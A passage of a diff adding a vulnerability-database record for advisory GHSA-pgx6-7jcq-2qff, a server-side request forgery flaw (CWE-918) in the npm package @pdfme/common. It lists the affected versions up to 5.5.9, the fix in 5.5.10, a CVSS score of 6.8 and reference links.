+      - pkg:npm/%40pdfme/common@5.3.13-dev.27
+      - pkg:npm/%40pdfme/common@5.3.13-dev.29
+      - pkg:npm/%40pdfme/common@5.3.13-dev.32
+      - pkg:npm/%40pdfme/common@5.3.13-dev.35
+      - pkg:npm/%40pdfme/common@5.3.13-dev.37
+      - pkg:npm/%40pdfme/common@5.3.13-dev.40
+      - pkg:npm/%40pdfme/common@5.3.13-dev.41
+      - pkg:npm/%40pdfme/common@5.3.13-dev.42
+      - pkg:npm/%40pdfme/common@5.3.13-dev.47
+      - pkg:npm/%40pdfme/common@5.3.13-dev.62
+      - pkg:npm/%40pdfme/common@5.3.13-dev.63
+      - pkg:npm/%40pdfme/common@5.3.13-dev.64
+      - pkg:npm/%40pdfme/common@5.3.13-dev.65
+      - pkg:npm/%40pdfme/common@5.3.13-dev.66
+      - pkg:npm/%40pdfme/common@5.3.13-dev.67
+      - pkg:npm/%40pdfme/common@5.3.13-dev.68
+      - pkg:npm/%40pdfme/common@5.3.13-dev.69
+      - pkg:npm/%40pdfme/common@5.3.13-dev.70
+      - pkg:npm/%40pdfme/common@5.3.13-dev.71
+      - pkg:npm/%40pdfme/common@5.3.13-dev.72
+      - pkg:npm/%40pdfme/common@5.3.13-dev.73
+      - pkg:npm/%40pdfme/common@5.3.13-dev.75
+      - pkg:npm/%40pdfme/common@5.3.13-dev.78
+      - pkg:npm/%40pdfme/common@5.3.13-dev.79
+      - pkg:npm/%40pdfme/common@5.3.13
+      - pkg:npm/%40pdfme/common@5.3.14-dev.1
+      - pkg:npm/%40pdfme/common@5.3.14-dev.2
+      - pkg:npm/%40pdfme/common@5.3.14-dev.3
+      - pkg:npm/%40pdfme/common@5.3.14-dev.4
+      - pkg:npm/%40pdfme/common@5.3.14-dev.6
+      - pkg:npm/%40pdfme/common@5.3.14-dev.7
+      - pkg:npm/%40pdfme/common@5.3.14-dev.9
+      - pkg:npm/%40pdfme/common@5.3.14-dev.10
+      - pkg:npm/%40pdfme/common@5.3.14-dev.11
+      - pkg:npm/%40pdfme/common@5.3.14-dev.12
+      - pkg:npm/%40pdfme/common@5.3.14-dev.17
+      - pkg:npm/%40pdfme/common@5.3.14-dev.18
+      - pkg:npm/%40pdfme/common@5.3.14
+      - pkg:npm/%40pdfme/common@5.3.15-dev.1
+      - pkg:npm/%40pdfme/common@5.3.15-dev.2
+      - pkg:npm/%40pdfme/common@5.3.15-dev.3
+      - pkg:npm/%40pdfme/common@5.3.15-dev.11
+      - pkg:npm/%40pdfme/common@5.3.15-dev.12
+      - pkg:npm/%40pdfme/common@5.3.15-dev.13
+      - pkg:npm/%40pdfme/common@5.3.15-dev.15
+      - pkg:npm/%40pdfme/common@5.3.15-dev.16
+      - pkg:npm/%40pdfme/common@5.3.15-dev.17
+      - pkg:npm/%40pdfme/common@5.3.15-dev.18
+      - pkg:npm/%40pdfme/common@5.3.15-dev.19
+      - pkg:npm/%40pdfme/common@5.3.15
+      - pkg:npm/%40pdfme/common@5.3.16-dev.1
+      - pkg:npm/%40pdfme/common@5.3.16-dev.2
+      - pkg:npm/%40pdfme/common@5.3.16-dev.3
+      - pkg:npm/%40pdfme/common@5.3.16-dev.4
+      - pkg:npm/%40pdfme/common@5.3.16-dev.5
+      - pkg:npm/%40pdfme/common@5.3.16-dev.6
+      - pkg:npm/%40pdfme/common@5.3.16-dev.7
+      - pkg:npm/%40pdfme/common@5.3.16-dev.8
+      - pkg:npm/%40pdfme/common@5.3.16-dev.9
+      - pkg:npm/%40pdfme/common@5.3.16-dev.10
+      - pkg:npm/%40pdfme/common@5.3.16-dev.11
+      - pkg:npm/%40pdfme/common@5.3.16-dev.16
+      - pkg:npm/%40pdfme/common@5.3.16-dev.18
+      - pkg:npm/%40pdfme/common@5.3.16-dev.19
+      - pkg:npm/%40pdfme/common@5.3.16-dev.20
+      - pkg:npm/%40pdfme/common@5.3.16-dev.21
+      - pkg:npm/%40pdfme/common@5.3.16-dev.22
+      - pkg:npm/%40pdfme/common@5.3.16-dev.23
+      - pkg:npm/%40pdfme/common@5.3.16-dev.24
+      - pkg:npm/%40pdfme/common@5.3.16-dev.25
+      - pkg:npm/%40pdfme/common@5.3.16-dev.26
+      - pkg:npm/%40pdfme/common@5.3.16-dev.27
+      - pkg:npm/%40pdfme/common@5.3.16-dev.28
+      - pkg:npm/%40pdfme/common@5.3.16-dev.29
+      - pkg:npm/%40pdfme/common@5.3.16-dev.30
+      - pkg:npm/%40pdfme/common@5.3.16
+      - pkg:npm/%40pdfme/common@5.3.17-dev.1
+      - pkg:npm/%40pdfme/common@5.3.17-dev.2
+      - pkg:npm/%40pdfme/common@5.3.17-dev.3
+      - pkg:npm/%40pdfme/common@5.3.17-dev.4
+      - pkg:npm/%40pdfme/common@5.3.17-dev.5
+      - pkg:npm/%40pdfme/common@5.3.17-dev.6
+      - pkg:npm/%40pdfme/common@5.3.17-dev.7
+      - pkg:npm/%40pdfme/common@5.3.17
+      - pkg:npm/%40pdfme/common@5.3.18-dev.1
+      - pkg:npm/%40pdfme/common@5.3.18
+      - pkg:npm/%40pdfme/common@5.3.19-dev.1
+      - pkg:npm/%40pdfme/common@5.3.19
+      - pkg:npm/%40pdfme/common@5.4.0-dev.2
+      - pkg:npm/%40pdfme/common@5.4.0-dev.3
+      - pkg:npm/%40pdfme/common@5.4.0-dev.4
+      - pkg:npm/%40pdfme/common@5.4.0-dev.5
+      - pkg:npm/%40pdfme/common@5.4.0-dev.6
+      - pkg:npm/%40pdfme/common@5.4.0-dev.7
+      - pkg:npm/%40pdfme/common@5.4.0-dev.8
+      - pkg:npm/%40pdfme/common@5.4.0-dev.9
+      - pkg:npm/%40pdfme/common@5.4.0-dev.10
+      - pkg:npm/%40pdfme/common@5.4.0-dev.18
+      - pkg:npm/%40pdfme/common@5.4.0-dev.19
+      - pkg:npm/%40pdfme/common@5.4.0-dev.20
+      - pkg:npm/%40pdfme/common@5.4.0-dev.21
+      - pkg:npm/%40pdfme/common@5.4.0-dev.42
+      - pkg:npm/%40pdfme/common@5.4.0-dev.43
+      - pkg:npm/%40pdfme/common@5.4.0-dev.44
+      - pkg:npm/%40pdfme/common@5.4.0-dev.45
+      - pkg:npm/%40pdfme/common@5.4.0-dev.47
+      - pkg:npm/%40pdfme/common@5.4.0-dev.48
+      - pkg:npm/%40pdfme/common@5.4.0-dev.51
+      - pkg:npm/%40pdfme/common@5.4.0-dev.52
+      - pkg:npm/%40pdfme/common@5.4.0-dev.53
+      - pkg:npm/%40pdfme/common@5.4.0-dev.55
+      - pkg:npm/%40pdfme/common@5.4.0-dev.56
+      - pkg:npm/%40pdfme/common@5.4.0-dev.57
+      - pkg:npm/%40pdfme/common@5.4.0-dev.58
+      - pkg:npm/%40pdfme/common@5.4.0-dev.59
+      - pkg:npm/%40pdfme/common@5.4.0-dev.63
+      - pkg:npm/%40pdfme/common@5.4.0-dev.65
+      - pkg:npm/%40pdfme/common@5.4.0-dev.66
+      - pkg:npm/%40pdfme/common@5.4.0-dev.67
+      - pkg:npm/%40pdfme/common@5.4.0-dev.68
+      - pkg:npm/%40pdfme/common@5.4.0
+      - pkg:npm/%40pdfme/common@5.4.1-dev.1
+      - pkg:npm/%40pdfme/common@5.4.1
+      - pkg:npm/%40pdfme/common@5.4.2-dev.1
+      - pkg:npm/%40pdfme/common@5.4.2-dev.2
+      - pkg:npm/%40pdfme/common@5.4.2-dev.3
+      - pkg:npm/%40pdfme/common@5.4.2
+      - pkg:npm/%40pdfme/common@5.4.3-dev.1
+      - pkg:npm/%40pdfme/common@5.4.3-dev.2
+      - pkg:npm/%40pdfme/common@5.4.3
+      - pkg:npm/%40pdfme/common@5.4.4-dev.1
+      - pkg:npm/%40pdfme/common@5.4.4-dev.2
+      - pkg:npm/%40pdfme/common@5.4.4-dev.3
+      - pkg:npm/%40pdfme/common@5.4.4-dev.4
+      - pkg:npm/%40pdfme/common@5.4.4-dev.5
+      - pkg:npm/%40pdfme/common@5.4.4-dev.6
+      - pkg:npm/%40pdfme/common@5.4.4-dev.7
+      - pkg:npm/%40pdfme/common@5.4.4-dev.8
+      - pkg:npm/%40pdfme/common@5.4.4-dev.9
+      - pkg:npm/%40pdfme/common@5.4.4-dev.10
+      - pkg:npm/%40pdfme/common@5.4.4-dev.11
+      - pkg:npm/%40pdfme/common@5.4.4-dev.12
+      - pkg:npm/%40pdfme/common@5.4.4-dev.13
+      - pkg:npm/%40pdfme/common@5.4.4-dev.14
+      - pkg:npm/%40pdfme/common@5.4.4-dev.15
+      - pkg:npm/%40pdfme/common@5.4.4
+      - pkg:npm/%40pdfme/common@5.4.5
+      - pkg:npm/%40pdfme/common@5.4.6-dev.1
+      - pkg:npm/%40pdfme/common@5.4.6-dev.2
+      - pkg:npm/%40pdfme/common@5.4.6-dev.3
+      - pkg:npm/%40pdfme/common@5.4.6-dev.4
+      - pkg:npm/%40pdfme/common@5.4.6-dev.25
+      - pkg:npm/%40pdfme/common@5.4.6-dev.26
+      - pkg:npm/%40pdfme/common@5.4.6-dev.29
+      - pkg:npm/%40pdfme/common@5.4.6-dev.30
+      - pkg:npm/%40pdfme/common@5.4.6-dev.31
+      - pkg:npm/%40pdfme/common@5.4.6-dev.32
+      - pkg:npm/%40pdfme/common@5.4.6-dev.33
+      - pkg:npm/%40pdfme/common@5.4.6
+      - pkg:npm/%40pdfme/common@5.4.7-dev.1
+      - pkg:npm/%40pdfme/common@5.4.7
+      - pkg:npm/%40pdfme/common@5.4.8-dev.1
+      - pkg:npm/%40pdfme/common@5.4.8
+      - pkg:npm/%40pdfme/common@5.5.0-dev.1
+      - pkg:npm/%40pdfme/common@5.5.0
+      - pkg:npm/%40pdfme/common@5.5.1-dev.1
+      - pkg:npm/%40pdfme/common@5.5.1
+      - pkg:npm/%40pdfme/common@5.5.2-dev.1
+      - pkg:npm/%40pdfme/common@5.5.2-dev.3
+      - pkg:npm/%40pdfme/common@5.5.2
+      - pkg:npm/%40pdfme/common@5.5.3-dev.1
+      - pkg:npm/%40pdfme/common@5.5.3-dev.2
+      - pkg:npm/%40pdfme/common@5.5.3
+      - pkg:npm/%40pdfme/common@5.5.4-dev.1
+      - pkg:npm/%40pdfme/common@5.5.4
+      - pkg:npm/%40pdfme/common@5.5.5-dev.1
+      - pkg:npm/%40pdfme/common@5.5.5
+      - pkg:npm/%40pdfme/common@5.5.6-dev.1
+      - pkg:npm/%40pdfme/common@5.5.6-dev.3
+      - pkg:npm/%40pdfme/common@5.5.6
+      - pkg:npm/%40pdfme/common@5.5.7-dev.2
+      - pkg:npm/%40pdfme/common@5.5.7-dev.3
+      - pkg:npm/%40pdfme/common@5.5.7-dev.4
+      - pkg:npm/%40pdfme/common@5.5.7
+      - pkg:npm/%40pdfme/common@5.5.8-dev.14
+      - pkg:npm/%40pdfme/common@5.5.8-dev.15
+      - pkg:npm/%40pdfme/common@5.5.8-dev.16
+      - pkg:npm/%40pdfme/common@5.5.8-dev.42
+      - pkg:npm/%40pdfme/common@5.5.8-dev.44
+      - pkg:npm/%40pdfme/common@5.5.8-dev.46
+      - pkg:npm/%40pdfme/common@5.5.8-dev.48
+      - pkg:npm/%40pdfme/common@5.5.8-dev.50
+      - pkg:npm/%40pdfme/common@5.5.8
+      - pkg:npm/%40pdfme/common@5.5.9-dev.2
+      - pkg:npm/%40pdfme/common@5.5.9-dev.4
+      - pkg:npm/%40pdfme/common@5.5.9-dev.6
+      - pkg:npm/%40pdfme/common@5.5.9-dev.7
+      - pkg:npm/%40pdfme/common@5.5.9-dev.19
+      - pkg:npm/%40pdfme/common@5.5.9
+    fixed_packages:
+      - pkg:npm/%40pdfme/common@5.5.10
+    fixed_in_commits: []
+    introduced_in_commits: []
+severities:
+  - score: '6.8'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:N/A:N
+    published_at:
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/03/GHSA-pgx6-7jcq-2qff/GHSA-pgx6-7jcq-2qff.json
+  - score: MODERATE
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at:
+    url:
+weaknesses:
+  - CWE-918
+references:
+  - url: https://github.com/pdfme/pdfme
+    reference_type:
+    reference_id:
+  - url: https://github.com/pdfme/pdfme/security/advisories/GHSA-pgx6-7jcq-2qff
+    reference_type:
+    reference_id: GHSA-pgx6-7jcq-2qff
+exploits: []
